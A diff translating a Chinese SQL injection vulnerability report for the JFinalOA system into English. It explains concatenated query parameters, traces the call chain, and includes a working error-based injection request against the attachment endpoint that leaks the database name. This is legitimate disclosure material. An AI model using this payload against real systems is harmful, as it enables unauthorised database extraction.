@@ -1,28 +1,26 @@
-# L-ONE-v1.0 JFinalOA SQL注入漏洞报告
+# L-ONE-v1.0 JFinalOA SQL Injection Vulnerability Report
 
-## 漏洞介绍
+## Introduction to Vulnerabilities
 
-JFinalOA（开源Java OA系统，基于JFinal 4.6框架）后台多处接口存在SQL注入。`busid`、`id`、`taskid` 等参数通过字符串拼接方式直接嵌入SQL语句，未使用参数化查询。
-
-JFinal ActiveRecord 的 `Db.find()` / `Db.paginate()` 方法接受拼接后的SQL字符串，`'"+param+"'` 模式导致闭合引号注入。系统无全局SQL过滤，所有参数均直接拼接。
-
-攻击者登录后即可执行报错注入、UNION注入、盲注提取数据库数据。
+Multiple interfaces in the backend of JFinalOA (an open-source Java OA system based on the JFinal 4.6 framework) are vulnerable to SQL injection. Parameters such as `busid`, `id`, and `taskid` are directly embedded into SQL statements through string concatenation, without using parameterized queries.
+The `Db.find()` / `Db.paginate()` methods of JFinal ActiveRecord accept concatenated SQL strings, and the `'"+param+"'` pattern leads to closed quotation injection. The system lacks global SQL filtering, and all parameters are concatenated directly.
+After logging in, the attacker can execute error injection, UNION injection, and blind injection to extract database data.
 
 ---
 
-## 影响版本
+## Affected Versions
 
-JFinalOA (L-ONE-v1.0) （最新版）
+JFinalOA (L-ONE-v1.0) （latest version）
 
-## 利用条件
+## Utilize conditions
 
-- 登录后即可利用（普通用户权限即可）
+- After logging in, you can use it (with ordinary user permissions)
 
 ---
 
-## 漏洞复现
+## Vulnerability Reproduction
 
-### 用户参数进入SQL语句的调用链
+### User parameters enter the call chain of the SQL statement
 
 ```
 AttachmentController.getBusinessUploadList()
@@ -32,13 +30,13 @@ AttachmentController.getBusinessUploadList()
   → Db.paginate(sql)                    ← 执行SQL
 ```
 
-提取当前数据库名：
+Extract the current database name:
 
 ```
 GET /JPointLion/admin/sys/attachment/getBusinessUploadList?pageNumber=1&pageSize=10&busid=1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT DATABASE())))%23
 ```
 
-返回：`XPATH syntax error: '~jfinaloa'`
+return：`XPATH syntax error: '~jfinaloa'`
 
 ![image-20260804100151780](https://github.com/fangtang7/picx-images-hosting/raw/master/JFinalOA/image-20260804100151780.4joth01zid.webp)
 
@@ -46,12 +44,12 @@ GET /JPointLion/admin/sys/attachment/getBusinessUploadList?pageNumber=1&pageSize
 
 ---
 
-## 源码分析
+## Source Code Analysis
 
-AttachmentController.java 第50-56行，getPara("busid","") 从HTTP GET参数中获取 busid 值，没有任何过滤，直接传给 Service。
+Lines 50-56 of AttachmentController.java, getPara("busid","") obtains the busid value from HTTP GET parameters without any filtering and directly passes it to the Service
 
 ![image-20260804100820217](https://github.com/fangtang7/picx-images-hosting/raw/master/JFinalOA/image-20260804100820217.8dxkzykgoa.webp)
 
-AttachmentService.java 第25-31行直接拼接拼接参数
+Lines 25-31 of AttachmentService.java directly concatenate parameters
 
 ![image-20260804100939564](https://github.com/fangtang7/picx-images-hosting/raw/master/JFinalOA/image-20260804100939564.8vnmojmby0.webp)
